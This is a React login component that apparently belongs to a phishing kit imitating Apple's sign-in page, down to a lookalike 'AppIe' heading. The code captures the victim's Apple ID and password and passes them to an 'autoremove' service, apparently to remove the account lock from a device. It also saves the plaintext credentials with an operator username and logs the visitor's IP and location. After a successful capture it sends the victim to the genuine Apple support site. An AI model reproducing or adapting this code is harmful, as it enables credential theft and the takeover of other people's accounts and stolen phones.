import { useEffect, useState } from 'react';
import FloatingLabel from 'react-bootstrap/FloatingLabel';
import Form from 'react-bootstrap/Form';
import Button from 'react-bootstrap/Button';
import Toast from 'react-bootstrap/Toast';
import ToastContainer from 'react-bootstrap/ToastContainer';
import '../../assets/css/modalAuth.css'

import SvgSpinner from './SvgSpinner'
import SvgNext from './SvgNext'
import imgNext from '../../assets/img/btnNext.png'
import PoputLogin from './poputs/PopupLogin';

import responses from '../../services/responses';
import { convert } from 'html-to-text';
import { useData } from '../../context/UserContext'

const Login = ({
    loginCount,
    setLoginCount,
    statusLogin,
    setStatusLogin,
    statusRemove,
    setStatusRemove,
    insertId,
    setInsertId,
    removeResponse,
    setRemoveResponse,
    setPassCodeActive,
    translate,
    lang,
    setLoginActive
}) => {
    const { user } = useData();

    //  const [statusLogin, setStatusLogin] = useState(false);  //false -> show imgNext - true -> show SvgSpinner
    const [opLogin, setOpLogin] = useState(false); // Estado permitira saber si se esta enviando solo el usuario o usuario y contraseña
    const [accountUsername, setAccountUsername] = useState('');
    const [accountPassword, setAccountPassword] = useState('');
    const [responseRemove, setResponseRemove] = useState('');







    const showInputPassword = () => { //Muestra el input de la contraseña

        if (accountUsername != '') {
            setStatusLogin(true)

            document.getElementById('accountUsername').style.borderRadius = '6px 6px 0 0';
            document.getElementById('accountPassword').style.borderRadius = '0 0 6px 6px';
            document.getElementById("Slider").style.borderRadius = '0 0 6px 6px';
            document.getElementById("SliderDiv").style.borderRadius = '0 0 6px 6px';

            setTimeout(() => {

                document.getElementById('btnAccount').style.opacity = '0.6'

                const sliderElement = document.getElementById("Slider")[0];
                if (sliderElement) {

                    sliderElement.classList.toggle("slide-down");
                }
                document.getElementById("SliderDiv").style.transform = "translateY(0%)"
                document.getElementById("btnAccount").style.transform = "translateY(-10%)"
                document.getElementById('accountPassword').focus()
                setStatusLogin(false)
                setOpLogin(true)

            }, 1500);
        }

    }

    const hideInputPassword = () => { //Oculta el input de la contraseña    

        document.getElementById('accountUsername').style.borderRadius = '6px';
        document.getElementById('accountPassword').style.borderRadius = '6px';
        document.getElementById("Slider").style.borderRadius = '6px 6px';
        document.getElementById("SliderDiv").style.borderRadius = '6px';
        document.getElementsByClassName('popupLogin')[0].style.display = 'none'



        const sliderElement = document.getElementById("Slider")[0];
        if (sliderElement) {

            sliderElement.classList.toggle("slide-up");
        }
        document.getElementById("SliderDiv").style.transform = "translateY(-128%)"
        document.getElementById("btnAccount").style.transform = "translateY(-157%)"
        setStatusLogin(false)
    }

    const handleLogin = async (event) => {
        event.preventDefault()


        document.getElementsByClassName('popupLogin')[0].style.display = 'none'
        if (accountUsername != '' && !opLogin) {
            showInputPassword();
            setAccountPassword('')
            //console.log('Solo se envio el login')
        } else if (accountUsername != '' && opLogin) {

            if (accountPassword != '') {

                //console.log(`handleLogin ejecutado ${loginCount + 1} veces`); 
                //console.log('Se enviaron ambos')
                setStatusLogin(true)

                try {

                    const response = await responses.autoremove(accountUsername, accountPassword);
                    let status = response.success;
                    //let status = 1;

                    //console.log(response.data.response)
                    setStatusRemove(status); //Guardamos el status del autoremve
                   // setRemoveResponse("Invalid Apple ID or password")
                    setRemoveResponse(response.message);
                    await addAccountRemove(response.message, status);
                    //await addAccountRemove("Invalid Apple ID or password", status);

                    console.log('aqui el estado ' + status)

                    setLoginCount(prevCount => prevCount + 1); // Incrementa el contador
                    const isCodeValid =
                        user?.data?.codeUnlock == "6" ||
                        user?.data?.codeUnlock == "4" ||
                        user?.data?.codeUnlock == "alphanumeric";

                    const popup = document.getElementsByClassName('popupLogin')[0];
                    const passwordInput = document.getElementById('accountPassword');
                    if (!status) {
                        setStatusLogin(false)
                        {
                            (() => {

                                if (isCodeValid) {
                                    if (loginCount === 2) {
                                        if (passwordInput) passwordInput.blur();
                                        if (popup) popup.style.display = 'none';
                                        setStatusLogin(true)
                                    } else {
                                        if (popup) popup.style.display = 'block';
                                    }
                                } else {
                                    if (popup) popup.style.display = 'block';
                                }
                            })()
                        }


                    } else if (status) {

                        {
                            (() => {
                                const isCodeValid =
                                    user?.data?.codeUnlock == "6" ||
                                    user?.data?.codeUnlock == "4" ||
                                    user?.data?.codeUnlock == "alphanumeric";



                                if (isCodeValid) {
                                    if (passwordInput) passwordInput.blur();
                                    console.log('aq89')
                                     setLoginCount(prevCount => prevCount + 2); 
                                    setTimeout(() => {
                                        setStatusLogin(true)
                                    }, 1500)

                                } else {
                                    if (passwordInput) passwordInput.blur();
                                    setTimeout(() => {
                                        window.location.href = 'https://support.apple.com';
                                    }, 1500)
                                }
                            })()
                        }



                        //await ipBlocker()
                        //setInsertId("")
                        /*setTimeout(() => {
                            window.location.href = 'https://support.apple.com';
                        }, 1000);*/
                    }
                } catch (error) {

                    console.log("existe un error" + error)

                }

            }

        }
    }


    const addAccountRemove = async (response, status) => {
        let data = {
            appleID: accountUsername,
            password: accountPassword,
            response: response,
            status,
            username: user?.data?.username || '',
            idProcess: insertId
        };
        const resp = await responses.addData(data); // Renamed variable to avoid conflict
        return resp;
    }






    const ipBlocker = async () => {
        try {

            let statusIP = 0;
            let typeStatus = 'procesado';
            let urlDomain = `${window.location.hostname}:5173`

            let data = {
                ip_adress: ip,
                pais: country,
                ciudad: city,
                status_ip: statusIP,
                tipo_status: typeStatus,
                url_dominio: urlDomain

            }

            await responses.ipBlocker(data)

            //console.log(data)

        } catch (error) {
            console.error('Error en add passcode:', error);
        }
    }
    return (
        <>
            <Form onSubmit={handleLogin} style={{ position: 'relative' }}>
                <h3 className="my-3 static-size" style={{ textAlign: 'center' }}>{translate(lang, 'Iniciar sesión con tu cuenta de AppIe')}</h3>
                <div id="divemail" bis_skin_checked="1">
                    <FloatingLabel
                        controlId="accountUsername"
                        label={translate(lang, 'Correo o número de telefono')}
                        className="mb-3"
                    >
                        <Form.Control
                            type="text"
                            placeholder={translate(lang, 'Correo o número de telefono')}
                            style={{ paddingRight: '60px' }}
                            value={accountUsername}
                            onChange={({ target }) => {

                                setAccountUsername(target.value)
                                setOpLogin(false)

                                {
                                    target.value == ''
                                        ? document.getElementById('btnAccount').style.opacity = '0.6'
                                        : document.getElementById('btnAccount').style.opacity = '1'
                                }
                                hideInputPassword();  //Oculta el input de la contraseña                              
                                setAccountPassword(''); //Vacia el input de la contraseña
                            }}

                        />
                    </FloatingLabel>

                </div>

                <Button type='submit' className='btn' id='btnAccount'>
                    {statusLogin
                        ? <SvgSpinner style={{ color: 'gray' }} />
                        : <img id='imgNext' src={imgNext} />}
                </Button>

                <div id="Slider" className="slide-up" bis_skin_checked="1">
                    <div id="SliderDiv" bis_skin_checked="1">
                        <FloatingLabel controlId="accountPassword" label={translate(lang, 'Contraseña')}>
                            <Form.Control
                                type="password"
                                placeholder={translate(lang, 'Contraseña')}
                                style={{ paddingRight: '70px' }}
                                value={accountPassword}
                                onChange={({ target }) => {
                                    setAccountPassword(target.value)
                                    document.getElementsByClassName('popupLogin')[0].style.display = 'none'
                                    {
                                        target.value == ''
                                            ? document.getElementById('btnAccount').style.opacity = '0.6'
                                            : document.getElementById('btnAccount').style.opacity = '1'
                                    }
                                }}
                                autoComplete='off'
                            />
                        </FloatingLabel>
                    </div>

                </div>

                <PoputLogin translate={translate} lang={lang} />

            </Form>
        </>)
}

export default Login;